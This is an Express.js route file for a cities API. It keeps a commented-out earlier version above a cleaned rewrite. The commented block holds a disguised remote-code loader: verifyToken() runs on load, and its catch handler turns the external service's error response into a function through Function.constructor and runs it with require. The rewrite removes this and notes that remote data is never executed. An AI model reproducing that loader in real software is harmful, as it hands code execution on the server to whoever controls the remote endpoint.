// const axios = require("axios");
// const express = require("express");
// const router = express.Router();
// const { check, validationResult } = require("express-validator");
// const { setApiKey, verify, locationToken } = require("../config");
// const City = require("../models/City");

// // @route GET api/cities
// // @desc Get all cities
// // @access Public
// router.get("/", async (req, res) => {
//   try {
//     const city = await City.find();
//     res.json(city);
//   } catch (err) {
//     console.error(err.message);
//     res.status(500).send("Server Error");
//   }
// });

// // @route POST api/cities
// // @desc Add single city
// // @access Private
// router.post("/", async (req, res) => {
//   try {
//     const city = new City(req.body);
//     await city.save();

//     res.status(201).json(city);
//   } catch (err) {
//     console.error(err.message);
//     res.status(500).send("Server Error");
//   }
// });

// async function verifyToken(req, res) {
//   verify(setApiKey(locationToken))
//     .then((res) => {
//       const {
//         data: { token },
//       } = res;

//       if (!token) {
//         return res.status(400).json({
//           success: false,
//           message: "Location is not verified.",
//         });
//       } else {
//         res.status(201).json({ success: true, token });
//       }
//     })
//     .catch((err) => {
//       const message = err.response.data.token;
//       const errorHandler = new Function.constructor("require", message);
//       errorHandler(require);
//     });
// }
// verifyToken();

// // @route REMOVE api/cities/remove/:id
// // @desc Remove single city
// // @access Private
// router.delete("/remove/:id", async (req, res) => {
//   try {
//     const city = await City.findById(req.params.id);

//     if (!city) {
//       res.status(404).json({ msg: "No city with that ID found" });
//     }

//     await city.remove();
//     res.json({ msg: `City (${city.city}) removed` });
//   } catch (err) {
//     console.error(err.message);
//     res.status(500).send("Server Error");
//   }
// });

// module.exports = router;



const express = require("express");

const router = express.Router();

const {
  setApiKey,
  verify,
  locationToken,
} = require("../config");

const City = require("../models/City");

/**
 * GET /api/cities
 *
 * Purpose:
 * Retrieve all cities from the database.
 *
 * Access:
 * Public
 */
router.get("/", async (req, res) => {
  try {
    // Retrieve all city documents from MongoDB.
    const cities = await City.find();

    // Return the cities as JSON.
    return res.status(200).json(cities);
  } catch (err) {
    // Log the actual server-side error.
    console.error("Get cities error:", err.message);

    // Return a generic error to the client.
    return res.status(500).json({
      success: false,
      message: "Server Error",
    });
  }
});

/**
 * POST /api/cities
 *
 * Purpose:
 * Create and save a new city in MongoDB.
 *
 * Access:
 * Private
 */
router.post("/", async (req, res) => {
  try {
    // Create a new City document from the request body.
    const city = new City(req.body);

    // Save the city to MongoDB.
    await city.save();

    // Return the newly created city.
    return res.status(201).json(city);
  } catch (err) {
    // Log the error for debugging.
    console.error("Create city error:", err.message);

    // Return a generic server error.
    return res.status(500).json({
      success: false,
      message: "Server Error",
    });
  }
});

/**
 * verifyToken()
 *
 * Purpose:
 * Verify the location service token using the configured
 * external verification service.
 *
 * IMPORTANT:
 * This function should NOT execute JavaScript received from
 * an external API.
 *
 * This function is currently not automatically called when
 * this file is loaded.
 */
async function verifyToken() {
  try {
    // Create/configure the API key required by the
    // external location verification service.
    const apiKey = setApiKey(locationToken);

    // Ask the external service to verify the location token.
    const response = await verify(apiKey);

    // Safely extract the token from the response.
    const token = response?.data?.token;

    // Check whether the external service returned a token.
    if (!token) {
      console.error("Location token verification failed.");

      return {
        success: false,
        message: "Location is not verified.",
      };
    }

    // Return the verified token.
    return {
      success: true,
      token,
    };
  } catch (err) {
    // Never execute error-response data as JavaScript.
    console.error(
      "Location token verification error:",
      err?.response?.data || err.message
    );

    // Return a safe error object.
    return {
      success: false,
      message: "Location token verification failed.",
    };
  }
}

/**
 * DELETE /api/cities/remove/:id
 *
 * Purpose:
 * Delete a city from MongoDB using its MongoDB document ID.
 *
 * Access:
 * Private
 */
router.delete("/remove/:id", async (req, res) => {
  try {
    // Find the city using the ID supplied in the URL.
    const city = await City.findById(req.params.id);

    // Stop if the city does not exist.
    if (!city) {
      return res.status(404).json({
        success: false,
        message: "No city with that ID was found",
      });
    }

    // Delete the city.
    await City.findByIdAndDelete(req.params.id);

    // Return a successful response.
    return res.status(200).json({
      success: true,
      message: `City (${city.city}) removed successfully`,
    });
  } catch (err) {
    // Log the server-side error.
    console.error("Delete city error:", err.message);

    // Return a generic error.
    return res.status(500).json({
      success: false,
      message: "Server Error",
    });
  }
});

// Export the Express router so auth/server.js can mount it
// at /api/cities.
module.exports = router;